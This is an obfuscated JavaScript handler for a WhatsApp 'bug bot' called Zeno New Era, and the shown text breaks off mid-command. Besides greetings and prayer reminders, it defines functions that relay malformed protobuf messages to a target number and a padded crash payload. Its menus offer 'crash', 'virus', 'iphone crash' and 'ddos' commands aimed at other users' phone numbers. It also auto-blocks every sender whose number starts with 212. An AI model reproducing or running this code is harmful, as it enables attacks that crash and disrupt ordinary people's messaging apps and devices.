module.exports = async (_0x1e35db, _0xe0b9f4, _0x1983dd) => {
  try {
    const _0x391d98 = _0xe0b9f4.key.remoteJid;
    const _0x254ceb = _0xe0b9f4.quoted ? _0xe0b9f4.quoted : _0xe0b9f4;
    var _0x95702b = _0xe0b9f4.mtype === 'interactiveResponseMessage' ? JSON.parse(_0xe0b9f4.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : _0xe0b9f4.mtype === "conversation" ? _0xe0b9f4.message.conversation : _0xe0b9f4.mtype == "imageMessage" ? _0xe0b9f4.message.imageMessage.caption : _0xe0b9f4.mtype == "videoMessage" ? _0xe0b9f4.message.videoMessage.caption : _0xe0b9f4.mtype == "extendedTextMessage" ? _0xe0b9f4.message.extendedTextMessage.text : _0xe0b9f4.mtype == 'buttonsResponseMessage' ? _0xe0b9f4.message.buttonsResponseMessage.selectedButtonId : _0xe0b9f4.mtype == 'listResponseMessage' ? _0xe0b9f4.message.listResponseMessage.singleSelectReply.selectedRowId : _0xe0b9f4.mtype == 'templateButtonReplyMessage' ? _0xe0b9f4.message.templateButtonReplyMessage.selectedId : _0xe0b9f4.mtype == 'messageContextInfo' ? _0xe0b9f4.message.buttonsResponseMessage?.["selectedButtonId"] || _0xe0b9f4.message.listResponseMessage?.["singleSelectReply"]["selectedRowId"] || _0xe0b9f4.text : '';
    const _0x4e0900 = typeof _0xe0b9f4.text == 'string' ? _0xe0b9f4.text : '';
    const _0x270d27 = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><`™©®Δ^βα¦|/\\©^]/.test(_0x95702b) ? _0x95702b.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!`™©®Δ^βα¦|/\\©^]/gi) : '.';
    const _0x539f0c = _0x95702b.replace(_0x270d27, '').trim().split(/ +/).shift().toLowerCase();
    const _0x34b560 = _0x95702b.trim().split(/ +/).slice(0x1);
    const _0x5343b2 = (_0x254ceb.msg || _0x254ceb).mimetype || '';
    const _0x2741d2 = q = _0x34b560.join(" ");
    const _0x2535de = _0x391d98.endsWith("@g.us");
    const _0x353f76 = await _0x1e35db.decodeJid(_0x1e35db.user.id);
    const _0x3d7422 = _0xe0b9f4.key.fromMe ? _0x1e35db.user.id.split(':')[0x0] + "@s.whatsapp.net" || _0x1e35db.user.id : _0xe0b9f4.key.participant || _0xe0b9f4.key.remoteJid;
    const _0x4d2f97 = _0x3d7422.split('@')[0x0];
    const _0x18b719 = _0xe0b9f4.pushName || '' + _0x4d2f97;
    const _0x2c2e8e = _0x353f76.includes(_0x4d2f97);
    const _0x58bdea = _0x2535de ? await _0x1e35db.groupMetadata(_0xe0b9f4.chat)["catch"](_0x433ad5 => {}) : '';
    const _0x229bdc = _0x2535de ? await _0x58bdea.participants : '';
    const _0x1bd10c = _0x2535de ? await _0x229bdc.filter(_0x1cead9 => _0x1cead9.admin !== null).map(_0x1bdf6a => _0x1bdf6a.id) : '';
    const _0x31ce92 = _0x2535de ? _0x1bd10c.includes(_0x353f76) : false;
    const _0x1c7e4e = () => {
      var _0x37c8fd = fs.readFileSync("./Drayyy.js").toString();
      var _0x44463e = (_0x37c8fd.match(/case '/g) || []).length;
      return _0x44463e;
    };
    const _0x19ae44 = _0x2535de ? _0x1bd10c.includes(_0x3d7422) : false;
    const _0x407c9f = moment.tz("Asia/Jakarta").format('DD/MM/YY');
    const _0x47703a = require("javascript-obfuscator");
    const {
      addSaldo: _0x3c6c55,
      minSaldo: _0x330aab,
      cekSaldo: _0x16788d
    } = require("./database/deposit");
    const {
      beta1: _0x32e71d,
      beta2: _0x5ad42c,
      buk1: _0x547ce8
    } = require("./database/hdr.js");
    const _0x36762e = fs.readFileSync("./zeno/anjay.jpg");
    if (_0xe0b9f4.sender.startsWith("212")) {
      return _0x1e35db.updateBlockStatus(_0xe0b9f4.sender, 'block');
    }
    const _0x545db7 = moment.tz('Asia/Jakarta').format("dddd, DD MMMM YYYY");
    const _0xf8922c = moment.tz('Asia/Jakarta').format("HH : mm :ss");
    const _0x4c0ab5 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (_0x4c0ab5 < "23:59:00") {
      var _0x205643 = "Selamat Malam 🏙️";
    }
    if (_0x4c0ab5 < "19:00:00") {
      var _0x205643 = "Selamat Petang 🌆";
    }
    if (_0x4c0ab5 < "18:00:00") {
      var _0x205643 = "Selamat Sore 🌇";
    }
    if (_0x4c0ab5 < "15:00:00") {
      var _0x205643 = "Selamat Siang 🌤️";
    }
    if (_0x4c0ab5 < "10:00:00") {
      var _0x205643 = "Selamat Pagi 🌄";
    }
    if (_0x4c0ab5 < "05:00:00") {
      var _0x205643 = "Selamat Subuh 🌆";
    }
    if (_0x4c0ab5 < '03:00:00') {
      var _0x205643 = "Selamat Tengah Malam 🌃";
    }
    _0x1e35db.autoshalat = _0x1e35db.autoshalat ? _0x1e35db.autoshalat : {};
    let _0x1c148a = _0xe0b9f4.chat;
    if (_0x1c148a in _0x1e35db.autoshalat) {
      return false;
    }
    let _0x254404 = {
      'shubuh': "04:29",
      'terbit': '05:44',
      'dhuha': "06:02",
      'dzuhur': '12:02',
      'ashar': "15:15",
      'magrib': '17:52',
      'isya': '19:01'
    };
    const _0x4a78ac = new Date(new Date().toLocaleString("en-US", {
      'timeZone': 'Asia/Jakarta'
    }));
    const _0xc93d3c = _0x4a78ac.getHours();
    const _0x647327 = _0x4a78ac.getMinutes();
    const _0x57cb33 = _0xc93d3c.toString().padStart(0x2, '0') + ':' + _0x647327.toString().padStart(0x2, '0');
    for (let [_0x5aa1d5, _0x1b9fba] of Object.entries(_0x254404)) {
      if (_0x57cb33 === _0x1b9fba) {
        _0x1e35db.autoshalat[_0x1c148a] = [_0x1e35db.sendMessage(_0xe0b9f4.chat, {
          'audio': {
            'url': "https://media.vocaroo.com/mp3/1ofLT2YUJAjQ"
          },
          'mimetype': 'audio/mp4',
          'ptt': true,
          'contextInfo': {
            'externalAdReply': {
              'showAdAttribution': true,
              'mediaType': 0x1,
              'mediaUrl': '',
              'title': "Selamat menunaikan Ibadah Sholat " + _0x5aa1d5 + " Sholatlah sebelum disholatin",
              'body': "🕑 " + _0x1b9fba,
              'sourceUrl': '',
              'thumbnail': await fs.readFileSync("./zeno/jadwal.jpg"),
              'renderLargerThumbnail': true
            }
          }
        }, {}), setTimeout(async () => {
          delete client.autoshalat[_0xe0b9f4.chat];
        }, 0xdea8)];
      }
    }
    const _0x4d5140 = JSON.parse(fs.readFileSync('./database/murbug.json'));
    const _0x34406b = JSON.parse(fs.readFileSync("./database/owner.json"));
    const _0x37e4b2 = _0x4d5140.includes(_0x3d7422);
    const _0xd5b998 = _0x34406b.includes(_0x4d2f97) || _0x2c2e8e;
    _0x1e35db.sendButtonVideo = async (_0x161625, _0x4dba5c, _0x29dad4, _0x4cd78c = {}) => {
      var _0x89a6d2 = await prepareWAMessageMedia({
        'video': {
          'url': _0x4cd78c && _0x4cd78c.video ? _0x4cd78c.video : ''
        }
      }, {
        'upload': _0x1e35db.waUploadToServer
      });
      let _0x4fc1a6 = generateWAMessageFromContent(_0x161625, {
        'viewOnceMessage': {
          'message': {
            'interactiveMessage': {
              'body': {
                'text': _0x4cd78c && _0x4cd78c.body ? _0x4cd78c.body : ''
              },
              'footer': {
                'text': _0x4cd78c && _0x4cd78c.footer ? _0x4cd78c.footer : ''
              },
              'header': {
                'hasMediaAttachment': true,
                'videoMessage': _0x89a6d2.videoMessage
              },
              'nativeFlowMessage': {
                'buttons': _0x4dba5c,
                'messageParamsJson': ''
              },
              'contextInfo': {
                'externalAdReply': {
                  'title': global.namabot,
                  'body': "𝐙𝐞𝐧𝐨 𝐍𝐞𝐰 𝐄𝐫𝐚",
                  'thumbnailUrl': global.imageurl,
                  'sourceUrl': global.isLink,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }
          }
        }
      }, {
        'quoted': _0x29dad4
      });
      await _0x1e35db.sendPresenceUpdate("composing", _0x161625);
      return _0x1e35db.relayMessage(_0x161625, _0x4fc1a6.message, {
        'messageId': _0x4fc1a6.key.id
      });
    };
    async function _0x21ef80(_0x35ad87, _0x383654, _0x193fb4, _0x133f88, _0x4774e4, _0x5403d9, _0x517da9, _0x10ad5a) {
      var _0x46e915 = generateWAMessageFromContent(_0x35ad87, proto.Message.fromObject({
        'qp': {
          'filter': {
            'filterName': _0x383654,
            'parameters': _0x193fb4,
            'filterResult': _0x133f88,
            'clientNotSupportedConfig': _0x4774e4
          },
          'filterClause': {
            'clauseType': _0x5403d9,
            'clauses': _0x517da9,
            'filters': _0x10ad5a
          }
        }
      }), {
        'userJid': _0x35ad87
      });
      await _0x1e35db.relayMessage(_0x35ad87, _0x46e915.message, {
        'participant': {
          'jid': _0x35ad87
        },
        'messageId': _0x46e915.key.id
      });
    }
    async function _0x273ce5(_0x1f5daa, _0x2cd23c, _0x593dd8, _0x183025, _0x332421, _0x33b475, _0x12ca13, _0x2e39a4, _0x42c882, _0x23aead, _0x9aae93, _0xdc3a1a, _0x5dc308, _0x366e08) {
      var _0x1fbc23 = generateWAMessageFromContent(_0x1f5daa, proto.Message.fromObject({
        'sessionStructure': {
          'sessionVersion': _0x2cd23c,
          'localIdentityPublic': _0x593dd8,
          'remoteIdentityPublic': _0x183025,
          'rootKey': _0x332421,
          'previousCounter': _0x33b475,
          'senderChain': _0x12ca13,
          'receiverChains': _0x2e39a4,
          'pendingKeyExchange': _0x42c882,
          'pendingPreKey': _0x23aead,
          'remoteRegistrationId': _0x9aae93,
          'localRegistrationId': _0xdc3a1a,
          'needsRefresh': _0x5dc308,
          'aliceBaseKey': _0x366e08
        }
      }), {
        'userJid': _0x1f5daa
      });
      await _0x1e35db.relayMessage(_0x1f5daa, _0x1fbc23.message, {
        'participant': {
          'jid': _0x1f5daa
        },
        'messageId': _0x1fbc23.key.id
      });
    }
    const _0x305bf0 = {
      'key': {
        'remoteJid': 'p',
        'fromMe': false,
        'participant': "0@s.whatsapp.net"
      },
      'message': {
        'interactiveResponseMessage': {
          'body': {
            'text': "Sent",
            'format': "DEFAULT"
          },
          'nativeFlowResponseMessage': {
            'name': 'galaxy_message',
            'paramsJson': "{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons" + "".repeat(0x7a120) + "\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}",
            'version': 0x3
          }
        }
      }
    };
    let _0x1ac537 = [];
    for (let _0x3f930b of _0x34406b) {
      _0x1ac537.push({
        'displayName': await _0x1e35db.getName(_0x3f930b + "@s.whatsapp.net"),
        'vcard': "BEGIN:VCARD\n\nVERSION:3.0\n\nN:" + (await _0x1e35db.getName(_0x3f930b + '@s.whatsapp.net')) + "\n\nFN:" + (await _0x1e35db.getName(_0x3f930b + "@s.whatsapp.net")) + "\n\nitem1.TEL;waid=" + _0x3f930b + ':' + _0x3f930b + "\n\nitem1.X-ABLabel:Ponsel\n\nitem2.EMAIL;type=INTERNET: drayoffc@gmail.com\n\nitem2.X-ABLabel:Email\n\nitem3.URL:https://drayxd.net\nitem3.X-ABLabel:YouTube\n\nitem4.ADR:;;Konoha;;;;\n\nitem4.X-ABLabel:Region\n\nEND:VCARD"
      });
    }
    try {
      ppuser = await _0x1e35db.profilePictureUrl(_0xe0b9f4.sender, "image");
    } catch (_0x265dc0) {
      ppuser = "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    async function _0x390bc5(_0x599ab5) {
      return new Promise((_0x2d9d72, _0x12e65a) => {
        try {
          const _0x3ec6b8 = _0x47703a.obfuscate(_0x599ab5, {
            'compact': false,
            'controlFlowFlattening': true,
            'controlFlowFlatteningThreshold': 0x1,
            'numbersToExpressions': true,
            'simplify': true,
            'stringArrayShuffle': true,
            'splitStrings': true,
            'stringArrayThreshold': 0x1
          });
          const _0x3b88cd = {
            'status': 0xc8,
            'author': "𝐳𝐞𝐧𝐨",
            'result': _0x3ec6b8.getObfuscatedCode()
          };
          _0x2d9d72(_0x3b88cd);
        } catch (_0xf256a7) {
          _0x12e65a(_0xf256a7);
        }
      });
    }
    if (!_0x1e35db["public"]) {
      if (!_0xe0b9f4.key.fromMe) {
        return;
      }
    }
    async function _0x3e2c98() {
      var _0x4b11c0 = ['☠︎', "☠︎☠︎", "☠︎ ☠︎", "☠︎ 𝐙𝐄 ☠︎", "☠︎ 𝐙𝐄𝐍𝐎 ☠︎"];
      let {
        key: _0x121b8e
      } = await _0x1e35db.sendMessage(_0x391d98, {
        'text': '☯︎'
      });
      for (let _0x3887b0 = 0x0; _0x3887b0 < _0x4b11c0.length; _0x3887b0++) {
        await _0x1e35db.sendMessage(_0x391d98, {
          'text': _0x4b11c0[_0x3887b0],
          'edit': _0x121b8e
        });
      }
    }
    const _0xd6f2c2 = _0x3add37 => {
      _0x1e35db.sendMessage(_0xe0b9f4.chat, {
        'text': _0x3add37,
        'contextInfo': {
          'mentionedJid': [_0x3d7422],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "𝒁𝒆𝒏𝒐 𝑵𝒆𝒘 𝑬𝒓𝒂",
            'body': '' + namabot,
            'previewType': "PHOTO",
            'thumbnailUrl': '',
            'thumbnail': fs.readFileSync("./zeno/Xynz.jpg"),
            'sourceUrl': '' + isLink
          }
        }
      }, {
        'quoted': _0xe0b9f4
      });
    };
    const _0x2205e2 = {
      'key': {
        'fromMe': false,
        'participant': '0@s.whatsapp.net',
        ...(_0x391d98 ? {
          'remoteJid': "status@broadcast"
        } : {})
      },
      'message': {
        'contactMessage': {
          'displayName': '' + _0x18b719,
          'vcard': "BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:" + _0x18b719 + ",\nitem1.TEL;waid=" + _0x3d7422.split('@')[0x0] + ':' + _0x3d7422.split('@')[0x0] + "\nitem1.X-ABLabel:Ponsel\nEND:VCARD",
          'jpegThumbnail': {
            'url': 'https://g.top4top.io/p_3194iz70l0.jpg'
          }
        }
      }
    };
    if (_0xe0b9f4.isGroup && !_0xe0b9f4.key.fromMe && !_0xd5b998 && antilink) {
      if (!_0x31ce92) {
        return;
      }
      if (_0x4e0900.match("whatsapp.com")) {
        _0x1e35db.sendMessage(_0xe0b9f4.chat, {
          'text': "*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group " + _0x58bdea.subject
        }, {
          'quoted': _0xe0b9f4
        });
        _0x1e35db.groupParticipantsUpdate(_0xe0b9f4.chat, [_0x3d7422], "delete");
        _0x1e35db.sendMessage(_0xe0b9f4.chat, {
          'delete': _0xe0b9f4.key
        });
      }
    }
    switch (_0x539f0c) {
      case "menu":
      case "help":
        {
          await _0x3e2c98();
          let _0x155525 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          const _0x55a99a = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x155525,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': " \n𝖅𝕰𝕹𝕺 𝕹𝕰𝖂 𝕰𝕽𝕬\n\nᴜɴᴛᴜᴋ ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ sɪʟᴀʜᴋᴀɴ ᴋʟɪᴋ ᴛᴏᴍʙᴏʟ ᴢᴇɴᴏ ᴅɪʙᴀᴡᴀʜ ɪɴɪ"
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "quick_reply",
                      'buttonParamsJson': "{\ndisplay_text: '𝐙𝐞𝐧𝐨 𝐍𝐞𝐰 𝐄𝐫𝐚',\ntitle: \"ℤ𝔼ℕ𝕆\",\nid: \".zeno\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x55a99a.message, {
            'messageId': _0x55a99a.key.id
          });
        }
        break;
      case "zeno":
        {
          await _0x3e2c98();
          let _0x348911 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x5ebd8a = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc;
          const _0x287cab = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x348911,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x5ebd8a
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    'buttons': [{
                      'name': 'single_select',
                      'buttonParamsJson': "{ \"title\": \"𝖅𝕰𝕹𝕴😈\", \"sections\": [{ \"title\": \"𝒁𝑬𝑵𝑶 𝑿 𝑫𝑹𝑨𝑮𝑶𝑵 𝑩𝑨𝑳𝑳\", \"highlight_label\": \"𝑺𝒑𝒆𝒔𝒊𝒂𝒍 𝑪𝒐𝒍𝒍𝒂𝒃\", \"rows\": [{ \"header\": \"𝘿𝙍𝘼𝙂𝙊𝙉 𝘽𝘼𝙇𝙇 𝘽𝙐𝙂\", \"title\": \"Menampilkan fitur collaboration\", \"id\": \".dgbug\" },\n{\"header\": \"𝙕𝙀𝙉𝙊 𝘽𝙐𝙂\", \"title\": \"Menampilkan fitur zeno bug\", \"id\": \".zenobug\" },\n{ \"header\": \"𝙕𝙀𝙉𝙊 𝘾𝙍𝘼𝙎𝙃\", \"title\": \"Menampilkan fitur zeno crash\", \"id\": \".zenocrash\" }, \n{ \"header\": \"𝙆𝙄𝙇𝙇 𝘽𝙐𝙂\", \"title\": \"Menampilkan fitur kill bug\", \"id\": \".killbug\" }, \n{ \"header\": \"𝙑𝙄𝙋 𝘽𝙐𝙂\", \"title\": \"Menampilkan fitur Vip bug\", \"id\": \".vipbug\" }, \n{ \"header\": \"𝘽𝙐𝙂 𝘿𝙄 𝙏𝙀𝙈𝙋𝘼𝙏\", \"title\": \"Menampilkan fitur bug in place\", \"id\": \".buginplace\" }, \n{ \"header\": \"𝙀𝙈𝙊𝙅𝙄 𝘽𝙐𝙂\", \"title\": \"Menampilkan fitur bug emoji\", \"id\": \".emojibug\" }, \n{ \"header\": \"𝘼𝙉𝘿𝙍𝙊𝙄𝘿 𝘾𝙍𝘼𝙎𝙃\", \"title\": \"Menampilkan fitur android crash\", \"id\": \".andro\" },\n{ \"header\": \"𝙄𝙋𝙃𝙊𝙉𝙀 𝘾𝙍𝘼𝙎𝙃\", \"title\": \"Menampilkan fitur iphone crash\", \"id\": \".ipon\" },\n{ \"header\": \"𝙑𝙄𝙍𝙐𝙎 𝙂𝘼𝙉𝘼𝙎\", \"title\": \"Menampilkan fitur virus ganas\", \"id\": \".virus\" },\n{ \"header\": \"𝘽𝙐𝙂 𝙒𝘼𝙉𝙂𝙎𝘼𝙁𝙁\", \"title\": \"Menampilkan fitur bug wa\", \"id\": \".bugwa\" },\n{ \"header\": \"𝙕𝙊𝙉𝘼 𝘿𝘿𝙊𝙎\", \"title\": \"Menampilkan fitur ddos\", \"id\": \".ddosmenu\" }, \n{ \"header\": \"𝙕𝙊𝙉𝘼 𝙊𝙒𝙉𝙀𝙍\", \"title\": \"List Owner Menu\", \"id\": \".ownermenu\" }]}]}"
                    }, {
                      'name': "cta_url",
                      'buttonParamsJson': "{\"display_text\":\"Script Bot\",\"url\":\"" + global.url + "\",\"merchant_url\":\"" + global.url + "\"}"
                    }, {
                      'name': 'quick_reply',
                      'buttonParamsJson': "{\"display_text\":\"Owner Bot\",\"title\":\"Kontak Owner\",\"id\":\".owner\"}"
                    }]
                  }),
                  'messageParamsJson': ''
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x287cab.message, {
            'messageId': _0x287cab.key.id
          });
        }
        break;
      case "dgbug":
        {
          await _0x3e2c98();
          let _0x5e91cd = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x49e0e6 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n \nঞ ＢＵＧ  ＢＡＬＬ\n" + global.simbol + " ʙᴀʟʟ1 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴀʟʟ𝟸 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴀʟʟ𝟹 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴀʟʟ𝟺 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴀʟʟ𝟻 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴀʟʟ𝟼 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴀʟʟ𝟽 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n\nঞ ＢＵＧ  ＰＯＷＥＲ\n" + global.simbol + " ɢᴏᴋᴜ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴠᴇɢᴇᴛᴀ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ɢᴏʜᴀɴ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴘɪᴄᴏʟᴏ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴜᴜ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ғʀɪᴇᴢᴀ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴋʀɪʟɪɴ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴛʀᴜɴᴋs － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ɢᴏᴛᴇɴ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴘɪᴄᴏʟᴏ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n";
          const _0x5b7d08 = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x5e91cd,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x49e0e6
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': 'cta_url',
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x5b7d08.message, {
            'messageId': _0x5b7d08.key.id
          });
        }
        break;
      case "zenobug":
        {
          await _0x3e2c98();
          let _0x1a7e9c = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x4fbf59 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴢᴇɴᴏ𝟷 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ𝟸 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ𝟹 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ𝟺 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ𝟻 － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ʙᴜɢᴢᴇɴᴏ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴢᴇɴᴏ-ʙᴀɴᴛᴀɪ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " sᴏᴅᴏᴋ-ᴢᴇɴᴏ － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x1fb22e = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x1a7e9c,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x4fbf59
                  },
                  'footer': {
                    'text': ''
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': "{\ndisplay_text: '𝘿𝙧𝙖𝙮𝙓𝘿 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡',\nurl: \"" + global.url + "\",\nmerchant_url: \"" + global.url + "\"\n}"
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          }, {
            'quoted': _0xe0b9f4
          });
          await _0x1e35db.relayMessage(_0xe0b9f4.chat, _0x1fb22e.message, {
            'messageId': _0x1fb22e.key.id
          });
        }
        break;
      case "killbug":
        {
          await _0x3e2c98();
          let _0x53a5a5 = await prepareWAMessageMedia({
            'image': _0x36762e
          }, {
            'upload': _0x1e35db.waUploadToServer
          });
          let _0x55c1d4 = "𝒁𝑬𝑵𝑶 𝐗𝐈𝐗\n𝖅𝖊𝖓𝖔 𝕹𝖊𝖜 𝕰𝖗𝖆 𝕾𝖕𝖊𝖘𝖎𝖆𝖑 𝖀𝖕𝖉𝖆𝖙𝖊\n\nі 𝖿ᥙᥴk ᥡ᥆ᥙ, ᥡ᥆ᥙ ᥴᥲᥒ'𝗍 kіᥣᥣ mᥱ 🤬\n▬▭▬▭▬▭▬▭▬▭\n🔥 𝐎𝐰𝐧 : " + global.namaown + "\n🔥 𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : 𝘿𝙧𝙖𝙮𝙓𝘿👿\n🔥 𝐁𝐨𝐭 : " + global.namabot + "\n🔥 𝐕𝐞𝐫𝐬𝐢 : " + global.versisc + "\n     \n" + global.simbol + " ᴏɴʟʏʙᴜɢ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴏɴᴇᴋɪʟʟ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴅᴏᴜʙʟᴇᴋɪʟʟ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴛʀɪᴘʟᴇᴋɪʟʟ － ??𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " ᴍᴀɴɪᴀᴄ － 𝗻𝘂𝗺𝗯𝗲𝗿 －\n" + global.simbol + " sᴀᴠᴀɢᴇ － 𝗻𝘂𝗺𝗯𝗲𝗿 －";
          const _0x3df7c7 = generateWAMessageFromContent(_0xe0b9f4.chat, {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    ..._0x53a5a5,
                    'hasMediaAttachment': false
                  },
                  'body': {
                    'text': _0x55c1d4
                  },
